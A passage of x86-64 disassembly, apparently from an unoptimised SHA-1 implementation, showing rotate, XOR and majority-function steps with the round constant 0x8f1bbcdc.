  405bf7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405bfe:	89 c0                	mov    %eax,%eax
  405c00:	48 c1 e8 1f          	shr    $0x1f,%rax
  405c04:	48 09 c8             	or     %rcx,%rax
  405c07:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  405c0b:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405c0f:	48 01 c2             	add    %rax,%rdx
  405c12:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c19:	48 01 c2             	add    %rax,%rdx
  405c1c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405c21:	48 01 d0             	add    %rdx,%rax
  405c24:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405c2b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c32:	48 c1 e0 1e          	shl    $0x1e,%rax
  405c36:	48 89 c2             	mov    %rax,%rdx
  405c39:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c40:	89 c0                	mov    %eax,%eax
  405c42:	48 c1 e8 02          	shr    $0x2,%rax
  405c46:	48 09 d0             	or     %rdx,%rax
  405c49:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405c50:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  405c54:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  405c58:	48 31 c2             	xor    %rax,%rdx
  405c5b:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405c5f:	48 31 c2             	xor    %rax,%rdx
  405c62:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405c66:	48 31 d0             	xor    %rdx,%rax
  405c69:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405c70:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c77:	48 c1 e0 05          	shl    $0x5,%rax
  405c7b:	48 89 c2             	mov    %rax,%rdx
  405c7e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c85:	89 c0                	mov    %eax,%eax
  405c87:	48 c1 e8 1b          	shr    $0x1b,%rax
  405c8b:	48 89 d1             	mov    %rdx,%rcx
  405c8e:	48 09 c1             	or     %rax,%rcx
  405c91:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c98:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405c9f:	48 89 d6             	mov    %rdx,%rsi
  405ca2:	48 21 c6             	and    %rax,%rsi
  405ca5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405cac:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405cb3:	48 09 d0             	or     %rdx,%rax
  405cb6:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  405cbd:	48 09 f0             	or     %rsi,%rax
  405cc0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405cc4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405ccb:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405ccf:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405cd6:	89 c0                	mov    %eax,%eax
